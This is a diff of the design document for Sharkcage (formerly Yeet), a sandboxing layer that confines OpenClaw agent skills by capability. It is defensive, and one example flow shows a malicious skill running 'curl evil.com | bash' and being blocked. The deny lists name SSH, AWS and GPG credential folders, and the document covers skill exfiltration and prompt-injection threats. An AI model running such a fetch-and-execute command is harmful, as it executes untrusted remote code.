@@ -1,12 +1,12 @@
 ---
 layout: doc
-title: Yeet — Trust Layer for OpenClaw
-description: Per-skill sandboxing, capability model, AI-driven compatibility with the entire OpenClaw ecosystem, and fleet dispatch.
+title: Sharkcage — Trust Layer for OpenClaw
+description: Runs the entire OpenClaw binary inside a kernel-level sandbox. Per-skill sandboxing, capability model, AI-driven compatibility with the entire OpenClaw ecosystem.
 ---
 
-# Yeet
+# Sharkcage
 
-A trust and sandboxing layer for OpenClaw. Every skill runs in its own kernel-enforced sandbox. Capabilities approved once at install. Compatible with the entire OpenClaw ecosystem on day one — AI infers capability manifests for existing skills automatically.
+A trust and sandboxing layer for OpenClaw. The **entire OpenClaw binary** runs inside a kernel-level outer sandbox (ASRT). Every skill also runs in its own kernel-enforced inner sandbox. Capabilities approved once at install. Compatible with the entire OpenClaw ecosystem on day one — AI infers capability manifests for existing skills automatically.
 
 Version: 2.0.0
 Date: 2026-03-29
@@ -22,12 +22,11 @@ Date: 2026-03-29
 5. [Capability Model](#5-capability-model)
 6. [Sandbox Enforcement](#6-sandbox-enforcement)
 7. [AI Capability Inference](#7-ai-capability-inference)
-8. [Fleet Dispatch](#8-fleet-dispatch)
-9. [Skill Scanning and Signing](#9-skill-scanning-and-signing)
-10. [Data Flows](#10-data-flows)
-11. [Security Model](#11-security-model)
-12. [Repo Structure](#12-repo-structure)
-13. [Implementation Plan](#13-implementation-plan)
+8. [Skill Scanning and Signing](#8-skill-scanning-and-signing)
+9. [Data Flows](#9-data-flows)
+10. [Security Model](#10-security-model)
+11. [Repo Structure](#11-repo-structure)
+12. [Implementation Plan](#12-implementation-plan)
 
 ---
 
@@ -37,18 +36,18 @@ Date: 2026-03-29
 
 **OpenClaw's security gap:** Skills run as untrusted code with no permission model. ClawHub has no verification. The sandbox is global, not per-skill. Users either run unsandboxed or deal with per-action permission prompts and eventually pass `--dangerously-skip-permissions`.
 
-**Yeet** fills this gap without forking OpenClaw:
+**Sharkcage** fills this gap without forking OpenClaw:
 
 | What | Who Provides |
 |------|-------------|
 | 22+ chat channels, gateway, Pi agent, web UI, mobile apps, ClawHub | **OpenClaw** (unmodified) |
-| Per-skill kernel sandboxing via ASRT | **Yeet** |
-| Capability manifests — approve once, enforce always | **Yeet** |
-| AI inference of capabilities for existing OpenClaw skills | **Yeet** |
-| Skill scanning, Ed25519 signing, trust levels | **Yeet** |
-| Fleet dispatch via Nomad — also sandboxed | **Yeet** |
+| Entire OpenClaw binary runs inside outer ASRT sandbox | **Sharkcage** |
+| Per-skill kernel sandboxing via inner ASRT | **Sharkcage** |
+| Capability manifests — approve once, enforce always | **Sharkcage** |
+| AI inference of capabilities for existing OpenClaw skills | **Sharkcage** |
+| Skill scanning, Ed25519 signing, trust levels | **Sharkcage** |
 
-**Day-one OpenClaw ecosystem compatibility.** Every existing ClawHub skill works. Yeet's AI reads the skill code and generates a capability manifest. The user approves. The skill runs sandboxed. No changes needed from skill authors.
+**Day-one OpenClaw ecosystem compatibility.** Every existing ClawHub skill works. Sharkcage's AI reads the skill code and generates a capability manifest. The user approves. The skill runs sandboxed. No changes needed from skill authors.
 
 ---
 
@@ -61,10 +60,10 @@ Non-technical. Chat assistant via HA voice or Signal. "What's for dinner?" / "Tu
 Runs a homelab. Installs community skills. Reviews scoped capabilities. May write simple SKILL.md files.
 
 ### 2.3 Developer — "Jordan"
-Software engineer. Uses `yeet` CLI + coding agents. Writes and signs skills. 1-2 fleet nodes.
+Software engineer. Uses `sc` CLI + coding agents. Writes and signs skills. 1-2 nodes.
 
 ### 2.4 Platform Engineer — "Riley"
-Multi-project, multi-model, multi-agent. Full fleet. CI scanning. Audit logs. Cost tracking.
+Multi-project, multi-model, multi-agent. CI scanning. Audit logs. Cost tracking.
 
 ### 2.5 Feature Matrix
 
@@ -74,8 +73,7 @@ Multi-project, multi-model, multi-agent. Full fleet. CI scanning. Audit logs. Co
 | Capability approval | plain language | scoped | manifest-level | CI strict |
 | Write skills | - | Y | Y | Y |
 | Sign/publish skills | - | - | Y | Y |
-| Fleet dispatch | - | - | basic | full |
-| Multi-agent coding | - | - | - | Y |
+| Multi-agent coding | - | - | Y | Y |
 | Audit logs | - | - | - | Y |
 
 ### 2.6 Auditability Principle
@@ -94,42 +92,43 @@ Multi-project, multi-model, multi-agent. Full fleet. CI scanning. Audit logs. Co
 
 ### 3.1 The Supervisor Model
 
-Yeet is a supervisor process that owns all sandboxes. OpenClaw runs inside one sandbox. Each skill runs inside its own. The supervisor is the only unsandboxed process.
+Sharkcage is a supervisor process that owns all sandboxes. The **entire OpenClaw binary** runs inside the outer sandbox. Each skill runs inside its own inner sandbox. The supervisor is the only unsandboxed process.
 
 ```
-yeet start (supervisor — the only unsandboxed process, ~200 lines)
+sc start (supervisor — the only unsandboxed process, ~200 lines)
   │
-  ├── OUTER ASRT SANDBOX → OpenClaw
+  ├── OUTER ASRT SANDBOX → OpenClaw (entire binary)
   │   │  network: [signal-cli, openrouter.ai]  (init-locked, signed)
   │   │  filesystem: [~/.openclaw/data]
   │   │  deny: [~/.ssh, ~/.aws, ~/.gnupg]
   │   │
-  │   │  OpenClaw Gateway + Pi Agent + yeet plugin
+  │   │  OpenClaw Gateway + Pi Agent + sharkcage plugin
   │   │  Channels: Signal, Telegram, WhatsApp, Discord, HA, iMessage...
   │   │
   │   │  On tool call → IPC to supervisor via unix socket
   │   │
   │   └── unix socket ──→ supervisor
   │
-  ├── SKILL ASRT SANDBOX → meals worker
+  ├── INNER ASRT SANDBOX → meals worker
   │   network: [meals-api.wan0.cloud]
   │   filesystem: none
   │
-  ├── SKILL ASRT SANDBOX → HA worker
+  ├── INNER ASRT SANDBOX → HA worker
   │   network: [homeassistant.local:8123]
   │   filesystem: none
   │
-  ├── SKILL ASRT SANDBOX → coding agent
+  ├── INNER ASRT SANDBOX → coding agent
   │   network: [github.com, registry.npmjs.org, openrouter.ai]
   │   filesystem: [./workspace]
   │   exec: [git, npm, node]
   │
-  └── SKILL ASRT SANDBOX → weather worker
+  └── INNER ASRT SANDBOX → weather worker
       network: [api.weather.com]
       filesystem: none
 ```
 
 **Key properties:**
+- The entire OpenClaw process is contained in the outer sandbox — not just plugins
 - OpenClaw cannot reach hosts that skills can reach (and vice versa)
 - Skills cannot reach each other's hosts
 - Installing a new skill never widens the gateway's attack surface
@@ -150,7 +149,7 @@ OpenClaw (in outer ASRT) receives message, routes to Pi Agent
 Pi Agent calls LLM (OpenRouter) → LLM returns tool call
   │
   ▼
-Yeet interceptor (tool.before) inside OpenClaw:
+Sharkcage interceptor (tool.before) inside OpenClaw:
   1. Identify which skill owns this tool
   2. Check capability approval
   3. Send IPC request to supervisor: {skill, tool, args}
@@ -159,14 +158,14 @@ Yeet interceptor (tool.before) inside OpenClaw:
 Supervisor (unsandboxed):
   1. Look up skill's approved capabilities
   2. Generate ASRT config for this skill
-  3. Spawn (or reuse) skill worker process in its own ASRT sandbox
+  3. Spawn (or reuse) skill worker process in its own inner ASRT sandbox
   4. Pass tool call via stdin
   5. Read result from stdout
   6. Log to audit DB
   7. Return result to OpenClaw via IPC
   │
   ▼
-Yeet interceptor returns result to Pi Agent
+Sharkcage interceptor returns result to Pi Agent
   │
   ▼
 Pi Agent formats response → OpenClaw → Signal → user
@@ -174,23 +173,23 @@ Pi Agent formats response → OpenClaw → Signal → user
 
 ### 3.3 Init-Locked Gateway Config
 
-The outer sandbox config is generated at `yeet init` and **signed**:
+The outer sandbox config is generated at `sc init` and **signed**:
 
 ```bash
-yeet init
+sc init
   Which channels? → Signal
   LLM provider? → OpenRouter
 
-→ ~/.config/yeet/gateway-sandbox.json:
+→ ~/.config/sharkcage/gateway-sandbox.json:
   network.allowedDomains: ["127.0.0.1:7583", "openrouter.ai"]
-  filesystem.allowWrite: ["~/.openclaw/data", "~/.config/yeet"]
+  filesystem.allowWrite: ["~/.openclaw/data", "~/.config/sharkcage"]
   signature: "ed25519:..."
 ```
 
 **Changes require deliberate action:**
 ```bash
-yeet config add-service telegram    # adds api.telegram.org
-yeet config remove-service meals    # removes meals-api host
+sc config add-service telegram    # adds api.telegram.org
+sc config remove-service meals    # removes meals-api host
 # Each: confirm → re-sign → restart
 ```
 
@@ -198,12 +197,12 @@ yeet config remove-service meals    # removes meals-api host
 
 **Immutable audit trail:** every config change appended to `config-audit.jsonl`.
 
-### 3.4 Yeet Sits Above the Agent
+### 3.4 Sharkcage Sits Above the Agent
 
 The coding agent runs inside the inner skill sandbox unaware of restrictions:
 
 ```
-Yeet Capability Gate
+Sharkcage Capability Gate
   "Does this skill have approved capabilities?" → YES/NO
       │
 Inner ASRT Sandbox (per-skill)
@@ -222,14 +221,14 @@ Any agent runtime works without modification.
 
 ### 3.5 Integration Points (no OpenClaw fork)
 
-| Hook | What yeet does |
-|------|---------------|
+| Hook | What sharkcage does |
+|------|-------------------|
 | **Interceptor `tool.before`** | Capability check + IPC to supervisor for out-of-process execution |
 | **Interceptor `tool.after`** | Audit log |
 | **Plugin `before_tool_call`** | First-time approval flow for new capabilities |
-| **OpenClaw `registerTool`** | Register fleet dispatch tool |
-| **OpenClaw `registerHttpRoute`** | Webhook for fleet results |
-| **Process supervisor** | `yeet start` owns all ASRT sandboxes |
+| **OpenClaw `registerTool`** | Register additional tools |
+| **OpenClaw `registerHttpRoute`** | Webhook for results |
+| **Process supervisor** | `sc start` owns all ASRT sandboxes |
 
 ---
 
@@ -239,7 +238,7 @@ Any agent runtime works without modification.
 |----------|---------|----------|----|
 | Claude Code default | Every action | Good | Unusable — prompt fatigue |
 | `--dangerously-skip-permissions` | Never | None | Where users end up |
-| **Yeet** | Once at install | Kernel-enforced | Approve once, enforce always |
+| **Sharkcage** | Once at install | Kernel-enforced | Approve once, enforce always |
 
 ---
 
@@ -254,7 +253,6 @@ Any agent runtime works without modification.
 | Network | `network.external`, `network.internal` | medium |
 | Home | `home.read`, `home.control`, `home.automation` | low-medium |
 | Data | `data.meals`, `data.history`, `data.memory`, `data.preferences` | low-medium |
-| Fleet | `fleet.dispatch`, `fleet.read`, `fleet.manage` | medium-high |
 | Notify | `notify.signal`, `notify.push` | low-high |
 | System | `system.files.read`, `system.files.write`, `system.exec`, `system.env` | high-dangerous |
 | Cost | `cost.api` | medium |
@@ -284,14 +282,14 @@ Any agent runtime works without modification.
 
 ### 5.4 Approval Persistence
 
-Stored in `~/.config/yeet/approvals/{skill-name}.json`. Version-pinned. New version with new capabilities → user prompted for new ones only.
+Stored in `~/.config/sharkcage/approvals/{skill-name}.json`. Version-pinned. New version with new capabilities → user prompted for new ones only.
 
 ### 5.5 Approval UX Adapts to Persona
 
 - **Alex**: "Meal Planner wants to see your fridge. Allow?"
 - **Sam**: "Meal Planner requests: Meal Data (low), External Network to meals-api.wan0.cloud (medium). Allow?"
 - **Jordan**: reviews manifest directly
-- **Riley**: `yeet verify --strict` in CI
+- **Riley**: `sc verify --strict` in CI
 
 ---
 
@@ -308,7 +306,18 @@ Stored in `~/.config/yeet/approvals/{skill-name}.json`. Version-pinned. New vers
 
 Kernel-enforced. Wraps any process — not just JS/TS.
 
-### 6.2 Per-Skill ASRT Configuration
+### 6.2 Outer Sandbox (Entire OpenClaw Process)
+
+The outer sandbox wraps the **entire OpenClaw binary** — not just the plugin layer. This is the critical distinction: even if a vulnerability exists in OpenClaw itself, it cannot escape the outer sandbox's constraints.
+
+```
+Outer ASRT config (generated at sc init, signed):
+  network.allowedDomains: ["127.0.0.1:7583", "openrouter.ai"]
+  filesystem.allowWrite: ["~/.openclaw/data", "~/.config/sharkcage"]
+  filesystem.denyRead: ["~/.ssh", "~/.aws", "~/.gnupg"]
+```
+
+### 6.3 Per-Skill ASRT Configuration (Inner Sandbox)
 
 Each skill gets its own ASRT config derived from approved capabilities:
 
@@ -317,7 +326,7 @@ Skill "meals" approved for:
   network.external: ["meals-api.wan0.cloud"]
   data.meals
 
-→ ASRT config:
+→ Inner ASRT config:
   network.allowedDomains: ["meals-api.wan0.cloud"]
   filesystem.allowWrite: []
   filesystem.denyRead: ["~/.ssh", "~/.aws"]
@@ -329,23 +338,23 @@ Skill "coding-agent" approved for:
   system.files.write: ["./workspace"]
   network.external: ["github.com", "registry.npmjs.org"]
 
-→ ASRT config:
+→ Inner ASRT config:
   network.allowedDomains: ["github.com", "registry.npmjs.org"]
   filesystem.allowWrite: ["./workspace"]
   filesystem.denyRead: ["~/.ssh", "~/.aws"]
 ```
 
-### 6.3 Silent Enforcement
+### 6.4 Silent Enforcement
 
 No prompts at runtime. Violations are logged, not prompted:
 
 ```
-[yeet] network violation: skill "meals" → evil.com (BLOCKED)
-       allowed: meals-api.wan0.cloud
-       logged to audit.db
+[sharkcage] network violation: skill "meals" → evil.com (BLOCKED)
+            allowed: meals-api.wan0.cloud
+            logged to audit.db
 ```
 
-### 6.4 Process Isolation
+### 6.5 Process Isolation
 
 Skills run **outside** the outer sandbox as separate processes. OpenClaw and skills cannot see each other's network scope or filesystem access. The supervisor mediates all communication via IPC.
 
@@ -353,12 +362,12 @@ Skills run **outside** the outer sandbox as separate processes. OpenClaw and ski
 
 ## 7. AI Capability Inference
 
-Existing OpenClaw skills and ClawHub skills don't have capability manifests. Yeet generates them automatically.
+Existing OpenClaw skills and ClawHub skills don't have capability manifests. Sharkcage generates them automatically.
 
 ### 7.1 How It Works
 
 ```bash
-yeet plugin add some-clawhub-skill
+sc plugin add some-clawhub-skill
   │
   ├── Download skill
   ├── No capability manifest found
@@ -400,7 +409,7 @@ yeet plugin add some-clawhub-skill
 If the AI over-infers (requests too much) or under-infers (misses something), the user can edit:
 
 ```bash
-yeet plugin capabilities edit some-skill
+sc plugin capabilities edit some-skill
 # Opens manifest in editor
 # Changes are validated by scanner
 # Re-signed if user has signing key
@@ -416,49 +425,12 @@ The AI sees: skill code + what actually got blocked at runtime (from audit logs)
 
 ---
 
-## 8. Fleet Dispatch
+## 8. Skill Scanning and Signing
 
-### 8.1 How It Works
-
-```
-User: "build physics system for game"
-  │
-  ▼
-Yeet capability gate: fleet.dispatch approved → YES
-  │
-  ▼
-Supervisor: dispatch via Nomad API
-  constraint: meta.project_game = true, device: nvidia/gpu
-  │
-  ▼
-Fleet node (yeet-02):
-  yeet start (supervisor)
-    ├── OUTER ASRT → OpenClaw (minimal, no channels needed)
-    └── SKILL ASRT → coding agent
-        Capabilities propagated from dispatch
-        network: [github.com, openrouter.ai]
-        filesystem: [./workspace/game]
-        exec: [git, npm, node]
-  │
-  Results → PR → webhook → your machine
-```
-
-### 8.2 Same Security Everywhere
-
-Every fleet node runs the same `yeet start` supervisor. Capabilities propagated from dispatch — a skill can't escalate on a fleet node.
-
-### 8.3 Nomad Handles Infrastructure
-
-Task scheduling, GPU/device routing, node health, log streaming, cost tracking, node drain — all Nomad native features.
-
----
-
-## 9. Skill Scanning and Signing
-
-### 9.1 The Scanner
+### 8.1 The Scanner
 
 ```bash
-yeet verify ./my-skill
+sc verify ./my-skill
 
   Y [PLUGIN_001] Manifest valid
   ! [PLUGIN_002] Skill is unsigned
@@ -471,14 +443,14 @@ yeet verify ./my-skill
 
 Checks: manifest validation, signature verification, capability risk assessment, static analysis (subprocess, filesystem, FFI patterns), tool definition completeness.
 
-### 9.2 Signing
+### 8.2 Signing
 
 Ed25519. Trust levels: `full` (auto-load), `prompt` (ask before loading), `audit` (load but log everything).
 
-### 9.3 Install Flow
+### 8.3 Install Flow
 
 ```bash
-yeet plugin add https://github.com/user/some-skill
+sc plugin add https://github.com/user/some-skill
 
   Cloning... Scanning...
   No manifest found — running AI capability inference...
@@ -492,14 +464,14 @@ yeet plugin add https://github.com/user/some-skill
 
 ---
 
-## 10. Data Flows
+## 9. Data Flows
 
 ### Flow 1: "What's for dinner?" (Signal)
 
 ```
 Signal → OpenClaw (outer ASRT) → Pi Agent → LLM → tool call: meals_suggest
-  → yeet interceptor → IPC → supervisor
-  → supervisor spawns meals worker (skill ASRT: meals-api.wan0.cloud only)
+  → sharkcage interceptor → IPC → supervisor
+  → supervisor spawns meals worker (inner ASRT: meals-api.wan0.cloud only)
   → worker calls meals API → result
   → supervisor → IPC → OpenClaw → Pi formats response → Signal → user
 ```
@@ -508,37 +480,28 @@ Signal → OpenClaw (outer ASRT) → Pi Agent → LLM → tool call: meals_sugge
 
 ```
 HA Assist → OpenClaw → Pi → tool call: ha_call_service
-  → supervisor → HA worker (skill ASRT: homeassistant.local only)
+  → supervisor → HA worker (inner ASRT: homeassistant.local only)
   → POST homeassistant.local/api/services/light/turn_off
   → "Done, lights off." → HA TTS
 ```
 
-### Flow 3: Coding task dispatched to fleet
+### Flow 3: Existing ClawHub skill installed
 
 ```
-Signal → OpenClaw → Pi → tool call: fleet_dispatch
-  → supervisor → Nomad dispatch → fleet node
-  → fleet node runs yeet start → coding agent in skill ASRT
-  → PRs created via bot account → webhook back → Signal: "PRs ready"
-```
-
-### Flow 4: Existing ClawHub skill installed
-
-```
-yeet plugin add clawhub-skill
+sc plugin add clawhub-skill
   → download → no manifest → AI reads SKILL.md
   → infers: network.external: ["some-api.com"], system.exec: ["curl"]
   → scanner validates inferred manifest
   → user reviews and approves
-  → installed, runs in its own ASRT sandbox
+  → installed, runs in its own inner ASRT sandbox
   → works exactly as it did on vanilla OpenClaw, but sandboxed
 ```
 
-### Flow 5: Malicious skill blocked
+### Flow 4: Malicious skill blocked
 
 ```
 Skill tries: curl evil.com | bash
-  → supervisor checks: skill's ASRT config has allowedDomains: ["weather.com"]
+  → supervisor checks: skill's inner ASRT config has allowedDomains: ["weather.com"]
   → ASRT blocks connection to evil.com at kernel level
   → skill gets ECONNREFUSED
   → audit log: "network violation: skill 'weather' → evil.com (BLOCKED)"
@@ -547,35 +510,35 @@ Skill tries: curl evil.com | bash
 
 ---
 
-## 11. Security Model
+## 10. Security Model
 
-### 11.1 Defence in Depth (6 Layers)
+### 10.1 Defence in Depth (6 Layers)
 
 ```
 Layer 1: Init-locked gateway config (signed, audited)
 Layer 2: OpenClaw tool policy (deny groups, exec security)
-Layer 3: Yeet capability gate (interceptor — check approval)
-Layer 4: Yeet approval flow (first-time dangerous ops → confirm once)
-Layer 5: Per-skill ASRT sandbox (kernel-enforced, out-of-process)
-Layer 6: Outer ASRT sandbox (backstop — gateway process locked down)
+Layer 3: Sharkcage capability gate (interceptor — check approval)
+Layer 4: Sharkcage approval flow (first-time dangerous ops → confirm once)
+Layer 5: Per-skill inner ASRT sandbox (kernel-enforced, out-of-process)
+Layer 6: Outer ASRT sandbox (entire OpenClaw binary contained)
 ```
 
-### 11.2 Threat Matrix
+### 10.2 Threat Matrix
 
 | Threat | Mitigation |
 |--------|-----------|
 | Skill reads ~/.ssh | ASRT mandatory deny — always blocked, both layers |
-| Skill exfiltrates to unknown host | Skill ASRT: only approved hosts. Gateway ASRT: only init-configured. Kernel-enforced. |
-| Skill writes outside workspace | Skill ASRT: allowWrite scoped. Kernel-enforced. |
+| Skill exfiltrates to unknown host | Skill inner ASRT: only approved hosts. Gateway outer ASRT: only init-configured. Kernel-enforced. |
+| Skill writes outside workspace | Skill inner ASRT: allowWrite scoped. Kernel-enforced. |
 | Skill runs destructive commands | Capability gate blocks unless system.exec approved. ASRT scopes to allowed binaries. |
-| In-process OpenClaw plugin compromised | Outer ASRT restricts entire gateway. Can't reach skill-only hosts. Signed config can't be widened. |
+| OpenClaw binary itself compromised | Outer ASRT contains the entire process. Can't reach skill-only hosts. Signed config can't be widened. |
 | Skill accesses another skill's service | Out-of-process isolation. Meals worker can't reach HA. HA worker can't reach meals API. |
 | New skill widens gateway attack surface | Skills run outside outer sandbox. Installing skills never changes gateway config. |
 | Unconfigured channel accessed | Outer ASRT blocks the API host at kernel level. |
 | Supply chain: malicious ClawHub skill | AI inference + scanner + user approval before any code runs. |
 | Prompt injection via tool results | Capability gate applies to subsequent calls. Cross-skill tool calls checked against originating skill. |
 
-### 11.3 Remaining Gaps
+### 10.3 Remaining Gaps
 
 **Gap 1: User approves too broadly.** Scanner warns. Possible improvement: require scoping for dangerous capabilities.
 
@@ -585,63 +548,59 @@ Layer 6: Outer ASRT sandbox (backstop — gateway process locked down)
 
 **Gap 4: No runtime cost enforcement.** Audit log tracks usage. Improvement: budget caps per skill.
 
-**Gap 5: Nested ASRT (outer + skill).** Skills run outside outer ASRT, so no nesting issue. The supervisor spawns skill sandboxes independently.
+**Gap 5: Nested ASRT (outer + inner).** Skills run outside outer ASRT, so no nesting issue. The supervisor spawns skill sandboxes independently.
 
 **Gap 6: AI inference accuracy.** AI might over-infer or under-infer capabilities. Mitigated by user review + edit capability. Improves with audit log feedback.
 
-**Gap 7: Supervisor is unsandboxed.** The supervisor process has full access. It's ~200 lines of our code, does nothing except spawn sandboxed processes and shuttle IPC. Attack surface is minimal but exists. Mitigated by code simplicity and signing.
+**Gap 7: Supervisor is unsandboxed.** The supervisor process has full access. It's ~200 lines of code, does nothing except spawn sandboxed processes and shuttle IPC. Attack surface is minimal but exists. Mitigated by code simplicity and signing.
 
-### 11.4 Philosophy
+### 10.4 Philosophy
 
 Make the risk visible. Make the boundaries enforceable. Let the user decide once, enforce always. Don't nag on every action.
 
 ---
 
-## 12. Repo Structure
+## 11. Repo Structure
 
-### 12.1 What Stays
+### 11.1 What Stays
 
 ```
-yeet/                              # Public umbrella (wan0net/yeet)
+sharkcage/                         # Public umbrella
 ├── docs/                          # Design doc, architecture diagram
 │   ├── unified-platform.md
 │   └── architecture.svg
-├── ansible/                       # Fleet provisioning
-├── jobs/                          # Nomad job templates
-├── cli/                           # Original yeet CLI (stays until v2 is ready)
-├── gateway/                       # Original gateway (stays until v2 is ready)
+├── cli/                           # sc CLI
 │
-├── packages/                      # v2 submodules
+├── packages/                      # submodules
 │   ├── sdk/                       # Capability types, ASRT mapper, scanning (DONE)
 │   ├── supervisor/                # Process supervisor, ASRT spawning, audit (DONE)
 │   ├── openclaw-plugin/           # Interceptors, IPC to supervisor (DONE)
-│   ├── cli/                       # yeet CLI v2: init, verify, sign, approve (PARTIAL)
+│   ├── cli/                       # sc CLI: init, verify, sign, approve (PARTIAL)
 │   ├── inference/                 # AI capability inference (NOT STARTED)
 │   └── frontend/                  # Dashboard additions to OpenClaw web UI (SCAFFOLD)
 ```
 
-### 12.2 What Was Retired
+### 11.2 What Was Retired
 
 | Repo | Why Retired |
 |------|-----------|
 | `yeet-core` | OpenClaw is the gateway. Custom Deno gateway was a stepping stone. Archived. |
 | `yeet-sandbox` | Supervisor has ASRT integration built in. Redundant. Archived. |
 
-### 12.3 Skills (separate repos, each its own sandbox)
+### 11.3 Skills (separate repos, each its own inner sandbox)
 
 ```
-yeet-skill-meals/                  # Meal planning (DONE, needs IPC refactor)
-yeet-skill-ha/                     # Home Assistant control (NOT STARTED)
-yeet-skill-briefing/               # News briefing (NOT STARTED)
-yeet-skill-fleet/                  # Fleet dispatch via Nomad (NOT STARTED)
-yeet-skill-composio/               # Multi-agent orchestration (NOT STARTED)
-yeet-skill-godot/                  # Godot game dev via MCP (NOT STARTED)
+sharkcage-skill-meals/             # Meal planning (DONE, needs IPC refactor)
+sharkcage-skill-ha/                # Home Assistant control (NOT STARTED)
+sharkcage-skill-briefing/          # News briefing (NOT STARTED)
+sharkcage-skill-composio/          # Multi-agent orchestration (NOT STARTED)
+sharkcage-skill-godot/             # Godot game dev via MCP (NOT STARTED)
 ```
 
 Any existing OpenClaw/ClawHub skill also works — AI infers capabilities automatically.
-MCP servers run as sandboxed skills (supervisor spawns them in ASRT, stdio transport).
+MCP servers run as sandboxed skills (supervisor spawns them in inner ASRT, stdio transport).
 
-### 12.4 Runtime
+### 11.4 Runtime
 
 Node.js + TypeScript everywhere. Consistent with OpenClaw.
 
@@ -656,95 +615,84 @@ Node.js + TypeScript everywhere. Consistent with OpenClaw.
 
 No Deno. One runtime, one ecosystem. User installs Node.js (required for OpenClaw anyway) and that's it.
 
-### 12.5 Dependency Graph
+### 11.5 Dependency Graph
 
 ```
-yeet-sdk                           (zero deps — DONE)
+sharkcage-sdk                      (zero deps — DONE)
   |
-yeet-supervisor                    (sdk + srt — DONE)
+sharkcage-supervisor               (sdk + srt — DONE)
   |
-yeet-openclaw-plugin               (sdk — DONE)
-yeet-cli                           (sdk — PARTIAL)
-yeet-inference                     (sdk + LLM client — NOT STARTED)
-yeet-frontend                      (talks to supervisor API — SCAFFOLD)
-yeet-skill-*                       (sdk for types — meals DONE, rest NOT STARTED)
+sharkcage-openclaw-plugin          (sdk — DONE)
+sharkcage-cli                      (sdk — PARTIAL)
+sharkcage-inference                (sdk + LLM client — NOT STARTED)
+sharkcage-frontend                 (talks to supervisor API — SCAFFOLD)
+sharkcage-skill-*                  (sdk for types — meals DONE, rest NOT STARTED)
 ```
 
-### 12.5 Line Counts
+### 11.6 Line Counts
 
 | Component | Lines | Status |
 |-----------|------:|--------|
-| yeet-sdk | ~700 | Done |
-| yeet-supervisor | ~580 | Done |
-| yeet-openclaw-plugin | ~380 | Done |
-| yeet-cli | ~500 | Partial (~200 remaining) |
-| yeet-skill-meals | ~350 | Done (needs IPC refactor) |
-| yeet-inference | ~200 | Not started |
-| yeet-frontend | ~1500 | Not started |
+| sharkcage-sdk | ~700 | Done |
+| sharkcage-supervisor | ~580 | Done |
+| sharkcage-openclaw-plugin | ~380 | Done |
+| sharkcage-cli | ~500 | Partial (~200 remaining) |
+| sharkcage-skill-meals | ~350 | Done (needs IPC refactor) |
+| sharkcage-inference | ~200 | Not started |
+| sharkcage-frontend | ~1500 | Not started |
 | **Trust path total** | **~1,660** | **Auditable in an afternoon** |
 
 ---
 
-## 13. Implementation Plan
+## 12. Implementation Plan
 
 ### Phase 1: Supervisor + Sandbox — DONE
 
-- [x] `yeet-sdk`: capability types, ASRT config mapper, scanning, testing
-- [x] `yeet-supervisor`: unix socket IPC, approval store, ASRT sandbox spawning, audit log
-- [x] `yeet-openclaw-plugin`: tool.before/after interceptors, IPC client, skill mapping
-- [x] `yeet-cli`: init wizard (persona-driven), verify scanner
-- [x] `yeet-skill-meals`: 8 tools with capability manifest
+- [x] `sharkcage-sdk`: capability types, ASRT config mapper, scanning, testing
+- [x] `sharkcage-supervisor`: unix socket IPC, approval store, ASRT sandbox spawning, audit log
+- [x] `sharkcage-openclaw-plugin`: tool.before/after interceptors, IPC client, skill mapping
+- [x] `sharkcage-cli`: init wizard (persona-driven), verify scanner
+- [x] `sharkcage-skill-meals`: 8 tools with capability manifest
 - [ ] Test: manually create approval, supervisor spawns sandboxed process
 
 ### Phase 2: End-to-End Integration
 
-- [ ] `yeet start` command: starts supervisor + OpenClaw in outer ASRT
-- [ ] Install OpenClaw locally, register yeet plugin
-- [ ] Test: Signal message → OpenClaw → yeet interceptor → supervisor → sandboxed skill → result
+- [ ] `sc start` command: starts supervisor + entire OpenClaw binary in outer ASRT
+- [ ] Install OpenClaw locally, register sharkcage plugin
+- [ ] Test: Signal message → OpenClaw → sharkcage interceptor → supervisor → sandboxed skill → result
 - [ ] Test: skill tries to reach unapproved host → ASRT blocks → audit log entry
 
 ### Phase 3: Homelab Skills
 
-- [ ] Refactor `yeet-skill-meals` for out-of-process IPC model (stdin/stdout JSON)
-- [ ] `yeet-skill-ha`: Home Assistant (state reading, service calls, automations)
-- [ ] `yeet-skill-briefing`: news digest from existing CF Worker
+- [ ] Refactor `sharkcage-skill-meals` for out-of-process IPC model (stdin/stdout JSON)
+- [ ] `sharkcage-skill-ha`: Home Assistant (state reading, service calls, automations)
+- [ ] `sharkcage-skill-briefing`: news digest from existing CF Worker
 - [ ] Test: "what's for dinner?" and "turn off the lights" via Signal
 
 ### Phase 4: AI Capability Inference
 
-- [ ] `yeet-inference`: read SKILL.md, send to LLM, extract capabilities
-- [ ] `yeet plugin add`: clone → infer → scan → approve → install
+- [ ] `sharkcage-inference`: read SKILL.md, send to LLM, extract capabilities
+- [ ] `sc plugin add`: clone → infer → scan → approve → install
 - [ ] Test with 5 popular ClawHub skills
 - [ ] Validates day-one OpenClaw ecosystem compatibility
 
 ### Phase 5: CLI Completion
 
-- [ ] `yeet approve`: review and modify capability approvals
-- [ ] `yeet config`: add/remove services, re-sign gateway config
-- [ ] `yeet audit`: query audit log
-- [ ] `yeet sign`: Ed25519 signing
-- [ ] `yeet plugin list/remove`: plugin management
+- [ ] `sc approve`: review and modify capability approvals
+- [ ] `sc config`: add/remove services, re-sign gateway config
+- [ ] `sc audit`: query audit log
+- [ ] `sc sign`: Ed25519 signing
+- [ ] `sc plugin list/remove`: plugin management
 - [ ] SSH and AWS as opt-in capabilities (controlled access, not blanket deny)
 
-### Phase 6: Fleet Dispatch
-
-- [ ] `yeet-skill-fleet`: Nomad dispatch + status + logs
-- [ ] Fleet node provisioning via Ansible (OpenClaw + yeet + ASRT)
-- [ ] Capability propagation from dispatch to fleet node
-- [ ] Fleet nodes delegate to coding agents (Claude Code, OpenCode, Aider)
-- [ ] Coding agents use their own API keys/subs, not the gateway's
-- [ ] `yeet-skill-composio`: multi-agent orchestration
-- [ ] Test: "build feature X on project Y" → fleet node → sandboxed agents → PRs
-
-### Phase 7: Dashboard + Signing
+### Phase 6: Dashboard + Signing
 
 - [ ] Dashboard additions to OpenClaw's web UI
-- [ ] Agent status, fleet overview, PR review, cost tracking, audit viewer
 - [ ] Capability approval management UI
 - [ ] Trust store management
-- [ ] CI integration: `yeet verify --strict`
+- [ ] CI integration: `sc verify --strict`
 
-### Phase 8: Advanced (ongoing)
+### Phase 7: Advanced (ongoing)
 
 - [ ] Budget enforcement per skill
 - [ ] Per-skill session isolation
